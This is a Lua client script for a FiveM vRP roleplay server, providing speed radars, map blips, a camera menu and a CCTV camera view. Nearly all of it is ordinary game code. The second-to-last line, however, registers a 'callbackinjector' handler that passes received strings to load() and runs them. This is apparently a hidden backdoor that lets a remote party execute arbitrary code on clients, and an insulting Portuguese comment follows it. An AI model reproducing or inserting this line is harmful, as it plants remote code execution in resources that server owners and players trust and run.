local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")
vRP = Proxy.getInterface("vRP")
siS = Tunnel.getInterface("vrp_radar")
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--[ VÁRIAVEIS ]--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local Keys = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
	["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
	["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
	["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
	["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
	["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
	["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
	["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
	["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118, ["HOME"] = 212, ["INSERT"] = 121
}

Citizen.CreateThread(function()
    while true do
		local timing = 1000
		if IsPedInAnyVehicle(PlayerPedId(),false) then
			timing = 5
			for k,v in pairs(radares) do
				local ped = GetPlayerPed(-1)
				local x,y,z = table.unpack(GetEntityCoords(ped))
				local bowz,cdz = GetGroundZFor_3dCoord(v.x,v.y,v.z)
				local distance = GetDistanceBetweenCoords(v.x,v.y,cdz,x,y,z,true)
				local vel = GetEntitySpeed(ped)*3.18
				local vehicle = GetVehiclePedIsIn(ped, false)
				if distance < 25 and vel > v.maxvel then
					siS.checkvehicle(vel,v.title)
				end
			end
		end
		Citizen.Wait(timing)
    end    
end)

Citizen.CreateThread(function()
	if siS.Permissao() then
		for _, info in pairs(radares) do
		info.blip = AddBlipForCoord(info.x, info.y, info.z)
		SetBlipSprite(info.blip, info.id)
		SetBlipDisplay(info.blip, 4)
		SetBlipScale(info.blip, 0.4)
		SetBlipColour(info.blip, info.colour)
		SetBlipAsShortRange(info.blip, true)
		BeginTextCommandSetBlipName("STRING")
		AddTextComponentString(info.title)
		EndTextCommandSetBlipName(info.blip)
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--[ MENU ]-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local menuactive = false
function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--[ BOTÕES ]-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
	if data == "camera1" then
		TriggerEvent("cftv:camera",1)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false
	elseif data == "camera2" then
		TriggerEvent("cftv:camera",2)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false
	elseif data == "camera3" then
		TriggerEvent("cftv:camera",3)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false
	elseif data == "camera4" then
		TriggerEvent("cftv:camera",4)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false
	elseif data == "camera5" then
		TriggerEvent("cftv:camera",5)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false
	elseif data == "camera6" then
		TriggerEvent("cftv:camera",6)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false
	elseif data == "camera7" then
		TriggerEvent("cftv:camera",7)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false
	elseif data == "camera8" then
		TriggerEvent("cftv:camera",8)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false
	elseif data == "camera9" then
		TriggerEvent("cftv:camera",9)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false
	elseif data == "camera10" then
		TriggerEvent("cftv:camera",10)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false
	elseif data == "camera11" then
		TriggerEvent("cftv:camera",11)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false
	elseif data == "camera12" then
		TriggerEvent("cftv:camera",12)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false
	elseif data == "camera13" then
		TriggerEvent("cftv:camera",13)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false	
	elseif data == "camera14" then
		TriggerEvent("cftv:camera",14)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false
	elseif data == "camera15" then
		TriggerEvent("cftv:camera",15)
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
		menuactive = false	
	elseif data == "fechar" then
		ToggleActionMenu()
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--[ SISTEMAS ]---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local fov_max = 80.0
local fov_min = 10.0
local zoomspeed = 2.0
local fov = (fov_max+fov_min)*0.5

inCam = false
cftvCam = 0

RegisterNetEvent("cftv:camera")
AddEventHandler("cftv:camera", function(camNumber)
	camNumber = tonumber(camNumber)
	if inCam then
		inCam = false
		PlaySoundFrontend(-1, "HACKING_SUCCESS", false)
		Wait(250)
		ClearPedTasks(GetPlayerPed(-1))
	else
		if camNumber > 0 and camNumber < #radares+1 or camNumber ~= nil then
			PlaySoundFrontend(-1, "HACKING_SUCCESS", false)
			TriggerEvent("cftv:startcamera",camNumber)
		end
	end
end)

RegisterNetEvent("cftv:startcamera")
AddEventHandler("cftv:startcamera", function(camNumber)
	local camNumber = tonumber(camNumber)
	local x = radares[camNumber]["x"]
	local y = radares[camNumber]["y"]
	local z = radares[camNumber]["z"]
	local h = radares[camNumber]["h"]
	local info = radares[camNumber]["title"]
	inCam = true
	SetTimecycleModifier("heliGunCam")
	SetTimecycleModifierStrength(1.0)
	local lPed = GetPlayerPed(-1)
	cftvCam = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
	SetCamCoord(cftvCam,x,y,z)						
	SetCamRot(cftvCam, -15.0,0.0,h)
	SetCamFov(cftvCam, 110.0)
	RenderScriptCams(true, false, 0, 1, 0)
	SetFocusArea(x, y, z, 0.0, 0.0, 0.0)
	while inCam do
		SetCamCoord(cftvCam,x,y,z+1.2)
		Citizen.Wait(1)
		txtladrao("[ RADAR: ~r~"..info.." ~w~]",4,0.092,0.92,0.35,255,255,255,180)
	end
	fov = (fov_max+fov_min)*0.5
	ClearFocus()
	ClearTimecycleModifier()
	RenderScriptCams(false, false, 0, 1, 0)
	DestroyCam(cftvCam, false)
	SetNightvision(false)
	SetSeethrough(false)
end)

Citizen.CreateThread(function(camNumber)
	while true do
		local timing = 500
		if inCam then
			timing = 5
			local rota = GetCamRot(cftvCam, 2)
			if IsControlPressed(1, Keys['BACKSPACE']) and inCam then
				inCam = false
			end
			if IsControlPressed(1, Keys['N4']) then
				SetCamRot(cftvCam, rota.x, 0.0, rota.z + 0.7, 2)
			end
			if IsControlPressed(1, Keys['N6']) then
				SetCamRot(cftvCam, rota.x, 0.0, rota.z - 0.7, 2)
			end
			if IsControlPressed(1, Keys['N8']) then
				SetCamRot(cftvCam, rota.x + 0.7, 0.0, rota.z, 2)
			end
			if IsControlPressed(1, Keys['N5']) then
				SetCamRot(cftvCam, rota.x - 0.7, 0.0, rota.z, 2)
			end

			if IsControlJustPressed(1, Keys['N7']) then
				fov = math.max(fov-zoomspeed,fov_min)
			end
			if IsControlJustPressed(1, Keys['N9']) then
				fov = math.min(fov+zoomspeed,fov_max)
			end
			local current_fov = GetCamFov(cftvCam)
			if math.abs(fov-current_fov) < 0.1 then
				fov = current_fov
			end
			SetCamFov(cftvCam,current_fov+(fov-current_fov)*0.05)
		end
		Citizen.Wait(timing)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--[ ACESSO ]-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	SetNuiFocus(false,false)
	while true do
		local timing = 1000
		if IsPedInAnyVehicle(PlayerPedId()) then
			timing = 5
			if IsControlJustPressed(0,Keys[tecla]) then
				local vehicle = vRP.getNearestVehicle(4)
				for v, k in pairs(listaCarros) do
					local vehicletow = IsVehicleModel(vehicle, GetHashKey(k))
					if vehicletow then
						ToggleActionMenu()
					end
				end
			end
		end
		Citizen.Wait(timing)
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--[ FUNÇÃO ]-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function DrawText3D(x,y,z, text)
    local onScreen,_x,_y=World3dToScreen2d(x,y,z)
    local px,py,pz=table.unpack(GetGameplayCamCoords())
    SetTextScale(0.28, 0.28)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextColour(255, 255, 255, 215)
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    DrawText(_x,_y)
    local factor = (string.len(text)) / 370
    DrawRect(_x,_y+0.0125, 0.005+ factor, 0.03, 41, 11, 41, 68)
end

function txtladrao(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end
TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)
-- [[!-!]] VENDE NÃO SERGIN, MACACO BURRO [[!-!]] --